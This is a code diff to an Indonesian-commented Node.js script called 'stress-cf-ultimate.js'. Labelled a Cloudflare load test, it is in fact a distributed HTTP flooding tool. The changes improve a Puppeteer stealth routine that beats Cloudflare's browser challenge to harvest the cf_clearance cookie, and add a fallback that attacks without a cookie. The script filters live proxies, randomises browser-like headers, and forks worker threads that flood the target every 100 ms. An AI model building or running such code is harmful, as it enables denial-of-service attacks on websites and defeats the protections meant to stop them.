@@ -1,7 +1,4 @@
-// stress-cf-ultimate.js 
-// Instalasi: npm install header-generator puppeteer-extra puppeteer-extra-plugin-stealth puppeteer axios https-proxy-agent user-agents --ignore-scripts
-// Jalankan: node stress-cf-ultimate.js <target> <duration_sec> <rate> <threads> <proxy_source>
-
+// stress-cf-ultimate.js - Uji Beban Cloudflare Ultimate (dengan debug & fallback)
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
@@ -18,7 +15,7 @@ puppeteer.use(StealthPlugin());
 // ==================== DETEKSI CHROMIUM UNTUK TERMUX ====================
 function findChromiumPath() {
   const possiblePaths = [
-    '/data/data/com.termux/files/usr/bin/chromium-browser', // <-- prioritas
+    '/data/data/com.termux/files/usr/bin/chromium-browser',
     '/data/data/com.termux/files/usr/bin/chromium',
     '/usr/bin/chromium-browser',
     '/usr/bin/chromium',
@@ -26,7 +23,6 @@ function findChromiumPath() {
   for (const p of possiblePaths) {
     if (fs.existsSync(p)) return p;
   }
-  // Coba pakai 'which' via child_process
   try {
     const { execSync } = require('child_process');
     const result = execSync('which chromium-browser chromium 2>/dev/null', { encoding: 'utf8' });
@@ -193,7 +189,7 @@ async function checkProxy(proxy, targetHost) {
   });
 }
 
-// ==================== CLOUDFLARE BYPASS (PUPPETEER) ====================
+// ==================== CLOUDFLARE BYPASS (PUPPETEER) DENGAN DEBUG ====================
 async function getCloudflareCookie(targetUrl, proxy = null) {
   console.log(`[CF-Bypass] Mencoba cookie melalui ${proxy || 'tanpa proxy'}`);
   const browser = await puppeteer.launch({
@@ -205,16 +201,37 @@ async function getCloudflareCookie(targetUrl, proxy = null) {
   try {
     const page = await browser.newPage();
     await page.setUserAgent(new UserAgent().toString());
-    await page.setViewport({ width: 1280, height: 720, deviceScaleFactor: 1 });
+    await page.setViewport({ width: 1280, height: 720 });
+    // Tambahkan ekstensi stealth
     await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
+    const content = await page.content();
+    // Cek apakah ada challenge Cloudflare
+    const isCF = content.includes('cf-challenge') || 
+                 content.includes('Checking your browser') ||
+                 content.includes('cf-browser-verification') ||
+                 content.includes('Cloudflare');
+    if (!isCF) {
+      console.log('[CF-Bypass] Target tidak menggunakan Cloudflare atau sudah bypassed.');
+      await browser.close();
+      // Kembalikan cookie kosong (tidak perlu)
+      return { value: 'no_cf_required', isCF: false };
+    }
+    // Tunggu sebentar untuk challenge selesai
+    await page.waitForFunction(
+      () => !document.querySelector('#cf-challenge') && !document.querySelector('#challenge-form'),
+      { timeout: 30000 }
+    ).catch(() => {});
     const cookies = await page.cookies();
     await browser.close();
     const cf = cookies.find(c => c.name === 'cf_clearance');
     if (cf) {
       console.log(`[CF-Bypass] Berhasil: ${cf.value}`);
-      return cf;
+      return { value: cf.value, isCF: true };
     }
-    console.log('[CF-Bypass] Gagal (tidak ada cf_clearance)');
+    // Jika gagal, simpan HTML untuk debug
+    const html = await page.content();
+    fs.writeFileSync('debug.html', html);
+    console.log('[CF-Bypass] Gagal mendapatkan cf_clearance. HTML disimpan ke debug.html');
     return null;
   } catch (err) {
     console.error('[CF-Bypass] Error:', err.message);
@@ -243,7 +260,7 @@ function generateHeaders(parsedTarget, cookie) {
     'accept-encoding': acceptEnc,
     'cache-control': randomElement(['no-cache', 'max-age=0', 'no-store']),
     'pragma': randomElement(['no-cache', '']),
-    'cookie': `cf_clearance=${cookie.value};`,
+    'cookie': cookie && cookie.value ? `cf_clearance=${cookie.value};` : '',
     'referer': referer,
     'sec-ch-ua': `"${randomElement(['Google Chrome','Chromium','Microsoft Edge','Opera'])}";v="${randomInt(100, 120)}", "Not?A_Brand";v="99"`,
     'sec-ch-ua-mobile': randomElement(['?0', '?1']),
@@ -354,16 +371,38 @@ if (cluster.isMaster) {
     }
     console.log(`[Proxy] ${alive} proxy hidup dari ${rawProxies.length}`);
 
-    let cookie = null;
+    // Coba bypass Cloudflare
+    let cookieData = null;
     const aliveProxies = rawProxies.filter(p => proxyManager.proxies.get(p).alive);
+    // Coba melalui proxy yang hidup
     for (const p of aliveProxies.slice(0, 5)) {
-      cookie = await getCloudflareCookie(args.target, p);
-      if (cookie) break;
+      const result = await getCloudflareCookie(args.target, p);
+      if (result && result.value) {
+        cookieData = result;
+        break;
+      }
     }
-    if (!cookie) cookie = await getCloudflareCookie(args.target, null);
-    if (!cookie) { console.log('[Fatal] Gagal melewati Cloudflare.'); process.exit(1); }
-    console.log(`[Master] Cookie: ${cookie.value}`);
+    if (!cookieData) {
+      // Coba tanpa proxy
+      const result = await getCloudflareCookie(args.target, null);
+      if (result && result.value) cookieData = result;
+    }
 
+    let cookie = null;
+    if (cookieData) {
+      if (cookieData.isCF === false) {
+        console.log('[Master] Target tidak membutuhkan cookie Cloudflare. Lanjut tanpa cookie.');
+        cookie = { value: '' };
+      } else {
+        cookie = { value: cookieData.value };
+        console.log(`[Master] Cookie berhasil: ${cookie.value}`);
+      }
+    } else {
+      console.log('[Warning] Gagal mendapatkan cookie. Mencoba tanpa cookie...');
+      cookie = { value: '' };
+    }
+
+    // Fork worker
     for (let i = 1; i <= args.threads; i++) {
       const worker = cluster.fork();
       worker.send({ cookie, proxies: rawProxies });
@@ -392,4 +431,4 @@ if (cluster.isMaster) {
       setInterval(() => runFlooder(cookie, manager, parsedTarget), 100);
     }
   });
-                                          }
+      }
